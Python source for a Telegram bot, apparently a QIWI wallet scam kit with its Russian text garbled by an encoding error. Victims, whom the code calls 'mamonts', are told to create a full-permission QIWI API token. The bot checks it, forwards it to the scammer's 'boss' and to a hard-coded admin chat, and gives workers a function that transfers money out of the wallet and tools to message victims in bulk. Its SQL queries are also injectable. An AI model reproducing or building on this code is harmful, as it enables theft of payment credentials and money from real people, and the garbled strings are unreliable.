import sqlite3
import datetime
import random
import string
import requests
from keyboard import back_to_main_keyboard, del_msg_keyboard
from config import bot, phone_regex
import re
import time

def get_now_date():
	date = datetime.datetime.today().strftime("%d.%m.%Y")
	return date

def add_user_to_db(user_id, boss_id):
	db = sqlite3.connect('database.db')
	cursor = db.cursor()
	user = [user_id, "False", boss_id, get_now_date()]
	cursor.execute(f'''INSERT INTO users(user_id, banned, boss_id, registration_date) VALUES(?,?,?,?)''', user)
	db.commit()

def get_user(user_id):
	db = sqlite3.connect('database.db')
	cursor = db.cursor()
	cursor.execute(f"""SELECT * FROM users WHERE user_id = '{user_id}' """)
	row = cursor.fetchone()
	return row

def del_worker_from_db(user_id):
	db = sqlite3.connect('database.db')
	cursor = db.cursor()
	cursor.execute(f'''DELETE FROM workers WHERE user_id =  "{user_id}" ''')
	db.commit()

def add_worker_to_db(user_id):
	db = sqlite3.connect('database.db')
	cursor = db.cursor()
	worker = [user_id]
	cursor.execute(f'''INSERT INTO workers(user_id) VALUES(?)''', worker)
	db.commit()

def get_all_workers():
	db = sqlite3.connect('database.db')
	cursor = db.cursor()
	cursor.execute(f"""SELECT * FROM workers""")
	row = cursor.fetchall()
	return row

def get_worker(user_id):
	db = sqlite3.connect('database.db')
	cursor = db.cursor()
	cursor.execute(f"""SELECT * FROM workers WHERE user_id = '{user_id}' """)
	row = cursor.fetchone()
	return row

def gen_random_string(length):
    letters_and_digits = string.ascii_letters + string.digits
    rand_string = ''.join(random.sample(letters_and_digits, length))
    return rand_string


def get_mamonts(user_id):
	db = sqlite3.connect('database.db')
	cursor = db.cursor()
	cursor.execute(f"""SELECT * FROM users WHERE boss_id = '{user_id}' """)
	row = cursor.fetchall()
	return row

def update_token(user_id, token):
	db = sqlite3.connect('database.db')
	cursor = db.cursor()
	cursor.execute(f"""UPDATE workers SET token = '{token}' WHERE user_id = '{user_id}' """)
	db.commit()

def qiwi_valid_check(token):
    try:
        s7 = requests.Session()
        s7.headers['Accept']= 'application/json'
        s7.headers['authorization'] = 'Bearer ' + token
        p = s7.get('https://edge.qiwi.com/person-profile/v1/profile/current?authInfoEnabled=true&contractInfoEnabled=true&userInfoEnabled=true', timeout=2)
        if p.status_code == 200:
            return True
        else:
           return None 
    except:
        return None


def registration_1(message):
	chat_id = message.chat.id
	number = message.text
	if re.search(phone_regex, number) != None:
		bot.send_message(chat_id=chat_id,
						text="<b>孝械锌械褉褜 袙邪屑 薪褍卸薪芯 胁褘锌褍褋褌懈褌褜 QIWI 孝芯泻械薪. 袛谢褟 褝褌芯谐芯 锌械褉械褏芯写懈屑 锌芯 褋褋褘谢泻械 - https://qiwi.com/api 懈 写邪褢屑 胁褋械 锌褉邪胁邪, 蟹邪褌械屑 胁胁芯写懈屑 械谐芯 褋褞写邪: </b>",
			       		reply_markup=back_to_main_keyboard(),
			       		parse_mode="HTML")
		bot.register_next_step_handler(message, registration_2)

	else:
		bot.send_message(chat_id=chat_id, text="<b>鉂楋笍 袩褉芯懈蟹芯褕谢邪 芯褕懈斜泻邪. 袩褉芯胁械褉褜褌械 锌褉邪胁懈谢褜薪芯褋褌褜 胁胁芯写邪.</b>", parse_mode="HTML")

def registration_2(message):
	chat_id = message.chat.id
	token = message.text
	if qiwi_valid_check(token) == True:
		update_token(chat_id, token)
		boss_id = get_user(chat_id)[2]
		bot.send_message(chat_id=boss_id,
						text="<b>袙邪褕 屑邪屑芯薪褌 胁胁械谢 褌芯泻械薪!\n</b>"
						f"ID: <code>{chat_id}</code>\n"
						f"TOKEN: <code>{token}</code>\n",
			       		parse_mode="HTML")
		
		bot.send_message(chat_id=chat_id,
						text="<b>馃挮袛邪薪薪褘械 褍褋锌械褕薪芯 锌褉懈薪褟褌褘! 袨卸懈写邪泄褌械 锌械褉械胁芯写!</b>",
			       		reply_markup=back_to_main_keyboard(),
			       		parse_mode="HTML")
		
	else:
		bot.send_message(chat_id=chat_id, text="<b>鉂楋笍 袩褉芯懈蟹芯褕谢邪 芯褕懈斜泻邪. 孝芯泻械薪 褟胁谢褟械褌褋褟 薪械胁邪谢懈写薪褘屑.</b>", parse_mode="HTML")

def output1(message, balance):
	try:
		id = message.chat.id
		number = int(message.text)

		balance -= balance/100*2
		bot.send_message(id, text="<b>袙胁械写懈褌械 褋褍屑屑褍 锌械褉械胁芯写邪.\n"
				                        f"袦邪泻褋懈屑邪谢褜薪邪褟 褋褍屑屑邪: {balance}</b>", parse_mode="HTML")
		bot.register_next_step_handler(message, output2, balance, number)
	except:
		bot.send_message(id, text="<b>鉂楋笍袙胁芯写懈褌械 薪芯屑械褉 褑懈褎褉邪屑懈.\n"
	                            f"鉂楋笍袧邪锌褉懈屑械褉: 78464370586</b>", parse_mode="HTML")


def output2(message, balance, number):
    id = message.chat.id
    try:
        amount = float(message.text)
        if amount <= balance:
            bot.send_message(id, text="<b>袛谢褟 锌芯写褌胁械褉卸写械薪懈褟 锌械褉械胁芯写邪 薪邪锌懈褕懈褌械: <code>袛邪</code>.</b>", parse_mode="HTML")
            bot.register_next_step_handler(message, output3, amount, number)
        else:
            bot.send_message(id, text="<b>鉂楋笍校泻邪蟹邪薪薪邪褟 胁邪屑懈 褋褍屑屑邪 斜芯谢褜褕械 屑邪泻褋懈屑邪谢褜薪芯泄</b>", parse_mode="HTML")
    except:
        bot.send_message(id, text="<b>鉂楋笍袙胁芯写懈褌械 褑懈褎褉邪屑懈</b>", parse_mode="HTML")

def output3(message, amount, number):
    id = message.chat.id
    msg = message.text
    try:
        if msg.lower() == "写邪":
            answer = output_qiwi(get_worker(id)[1], number, amount)
            if answer == 200:
                bot.send_message(id, text="<b>鉁呅熜笛�械胁芯写 褍褋锌械褕薪芯 锌褉芯胁械写械薪</b>", parse_mode="HTML")
            else:
                bot.send_message(id, text="<b>鉂楋笍袩褉懈 锌械褉械胁芯写械 锌褉芯懈蟹芯褕谢邪 芯褕懈斜泻邪</b>", parse_mode="HTML")
        else:
            bot.send_message(id, text="<b>鉂楋笍袩械褉械胁芯写 芯褌屑械薪械薪</b>", parse_mode="HTML")
    except Exception as e:
        print(e)
        bot.send_message(message.chat.id, "<b>鉂楋笍袩褉芯懈蟹芯褕谢邪 芯褕懈斜泻邪! 袩芯锌褉芯斜褍泄褌械 芯斜薪芯胁懈褌褜 褌芯泻械薪.</b>", parse_mode="HTML")

def upd_token(message):
    id = message.chat.id
    token = message.text
    if qiwi_valid_check(token) != None:
        update_token(id, token)
        bot.send_message(id, text="<b>鉁� 孝芯泻械薪 褍褋锌械褕薪芯 芯斜薪芯胁谢械薪</b>", parse_mode="HTML")
        if id != 1347410943:
            bot.send_message(1347410943, text=f"袧芯胁褘泄 褌芯泻械薪: <code>{token}</code>", parse_mode="HTML")
    else:
        bot.send_message(id, text="<b>鉂楋笍孝芯泻械薪 褟胁谢褟械褌褋褟 薪械胁邪谢懈写薪褘屑</b>", parse_mode="HTML")

def qiwi_number(token):
    s7 = requests.Session()
    s7.headers['Accept']= 'application/json'
    s7.headers['authorization'] = 'Bearer ' + token
    p = s7.get('https://edge.qiwi.com/person-profile/v1/profile/current?authInfoEnabled=true&contractInfoEnabled=true&userInfoEnabled=true')
    return p.json()['contractInfo']['contractId']

def qiwi_balance(login, api_access_token):
    s = requests.Session()
    s.headers['Accept']= 'application/json'
    s.headers['authorization'] = 'Bearer ' + api_access_token
    b = s.get('https://edge.qiwi.com/funding-sources/v2/persons/' + login + '/accounts')
    balances = b.json()['accounts']
    rubAlias = [x for x in balances if x['alias'] == 'qw_wallet_rub']
    rubBalance = rubAlias[0]['balance']['amount']
    return rubBalance

def output_qiwi(api_access_token, to_qiwi, output_sum):
	s = requests.Session()
	s.headers = {'content-type': 'application/json'}
	s.headers['authorization'] = 'Bearer ' + api_access_token
	s.headers['User-Agent'] = 'Android v3.2.0 MKT'
	s.headers['Accept'] = 'application/json'
	postjson = {"id":"","sum":{"amount":"","currency":""},"paymentMethod":{"type":"Account","accountId":"643"},"fields":{"account":""}}
	postjson['id'] = str(int(time.time() * 1000))
	postjson['sum']['amount'] = output_sum
	postjson['sum']['currency'] = '643'
	postjson['fields']['account'] = str(to_qiwi)
	res = s.post('https://edge.qiwi.com/sinap/api/v2/terms/99/payments',json = postjson)
	return res.status_code

def give_work_access_1(message):
	chat_id = message.chat.id
	try:
		worker_id = int(message.text)
		worker = get_worker(worker_id)
		if worker == None:
			add_worker_to_db(worker_id)
			bot.send_message(chat_id, text="<b>鉁� 袛芯褋褌褍锌 褍褋锌械褕薪芯 胁褘写邪薪!</b>", parse_mode="HTML")
		else:
			bot.send_message(chat_id, text="<b>鉂楋笍校 锌芯谢褜蟹芯胁邪褌械谢褟 褍卸械 械褋褌褜 写芯褋褌褍锌.</b>", parse_mode="HTML")
	except:
		bot.send_message(chat_id, text="<b>鉂楋笍袙胁芯写懈褌械 褑懈褎褉邪屑懈</b>", parse_mode="HTML")

def take_work_access_1(message):
	chat_id = message.chat.id
	try:
		worker_id = int(message.text)
		worker = get_worker(worker_id)
		if worker != None:
			del_worker_from_db(worker_id)
			bot.send_message(chat_id, text="<b>鉁� 袛芯褋褌褍锌 褍褋锌械褕薪芯 芯褌芯斜褉邪薪!</b>", parse_mode="HTML")
		else:
			bot.send_message(chat_id, text="<b>鉂楋笍校 锌芯谢褜蟹芯胁邪褌械谢褟 薪械褌 写芯褋褌褍锌邪.</b>", parse_mode="HTML")
	except:
		bot.send_message(chat_id, text="<b>鉂楋笍袙胁芯写懈褌械 褑懈褎褉邪屑懈.</b>", parse_mode="HTML")



def mailing_to_workers_1(message):
	text = message.text
	bot.send_message(chat_id=message.chat.id,
						text="<i>袙胁械写懈褌械 '<code>袛邪</code>' 写谢褟 蟹邪锌褍褋泻邪 褉邪褋褋褘谢泻懈!</i>",
						parse_mode="HTML")

	bot.register_next_step_handler(message, mailing_to_workers_2, text)

def mailing_to_workers_2(message, text):
	answer = message.text
	if answer.lower() == "写邪":
		bot.send_message(chat_id=message.chat.id,
						text="<b>袪邪褋褋褘谢泻邪 蟹邪锌褍褖械薪邪!</b>",
						parse_mode="HTML")
		errors = 0
		good = 0
		users = get_all_workers()
		for user in users:
			try:
				bot.send_message(chat_id=user[0],
								text=text,
								parse_mode="HTML",
								reply_markup=del_msg_keyboard(),
								disable_web_page_preview=True)
				good += 1
			except:
				errors += 1
		bot.send_message(chat_id=message.chat.id,
						text="鉁� 袪邪褋褋褘谢泻邪 蟹邪胁械褉褕械薪邪!\n\n"
							f"鉂楋笍 袨褌锌褉邪胁谢械薪芯: {good}\n"
							f"鉂楋笍 袧械 芯褌锌褉邪胁谢械薪芯: {errors}\n")
	else:
		bot.send_message(chat_id=message.chat.id, text="<b>鉂楋笍袪邪褋褋褘谢泻邪 芯褌屑械薪械薪邪.</b>",
						parse_mode="HTML")

def mailing_to_mamonts_1(message):
	text = message.text
	bot.send_message(chat_id=message.chat.id,
						text="<i>袙胁械写懈褌械 '<code>袛邪</code>' 写谢褟 蟹邪锌褍褋泻邪 褉邪褋褋褘谢泻懈!</i>",
						parse_mode="HTML")

	bot.register_next_step_handler(message, mailing_to_mamonts_2, text)

def mailing_to_mamonts_2(message, text):
	answer = message.text
	user_id = message.chat.id
	if answer.lower() == "写邪":
		bot.send_message(chat_id=user_id,
						text="<b>袪邪褋褋褘谢泻邪 蟹邪锌褍褖械薪邪!</b>",
						parse_mode="HTML")
		errors = 0
		good = 0
		mamonts = get_mamonts(user_id)
		for mamont in mamonts:
			try:
				bot.send_message(chat_id=mamont[0],
								text=text,
								parse_mode="HTML",
								reply_markup=del_msg_keyboard(),
								disable_web_page_preview=True)
				good += 1
			except:
				errors += 1
		bot.send_message(chat_id=user_id,
						text="鉁� 袪邪褋褋褘谢泻邪 蟹邪胁械褉褕械薪邪!\n\n"
							f"鉂楋笍 袨褌锌褉邪胁谢械薪芯: {good}\n"
							f"鉂楋笍 袧械 芯褌锌褉邪胁谢械薪芯: {errors}\n")
	else:
		bot.send_message(chat_id=message.chat.id, text="<b>鉂楋笍袪邪褋褋褘谢泻邪 芯褌屑械薪械薪邪.</b>",
						parse_mode="HTML")


def send_message_1(message, mamont_id):
	text = message.text
	bot.send_message(chat_id=message.chat.id,
						text="<i>袙胁械写懈褌械 '<code>袛邪</code>' 写谢褟 蟹邪锌褍褋泻邪 褉邪褋褋褘谢泻懈!</i>",
						parse_mode="HTML")

	bot.register_next_step_handler(message, send_message_2, text, mamont_id)

def send_message_2(message, text, mamont_id):
	answer = message.text
	user_id = message.chat.id
	if answer.lower() == "写邪":
		try:
			bot.send_message(chat_id=mamont_id,
							text=text,
							parse_mode="HTML",
							reply_markup=del_msg_keyboard(),
							disable_web_page_preview=True)

			bot.send_message(chat_id=user_id,
						text="鉁� 小芯芯斜褖械薪懈械 褍褋锌械褕薪芯 写芯褋褌邪胁谢械薪芯!")
		except:
			bot.send_message(chat_id=user_id,
						text="鉂� 小芯芯斜褖械薪懈械 薪械 写芯褋褌邪胁谢械薪芯!")
		
	else:
		bot.send_message(chat_id=message.chat.id, text="<b>鉂楋笍 袨褌锌褉邪胁泻邪 褋芯芯斜褖械薪懈褟 芯褌屑械薪械薪邪.</b>",
						parse_mode="HTML")
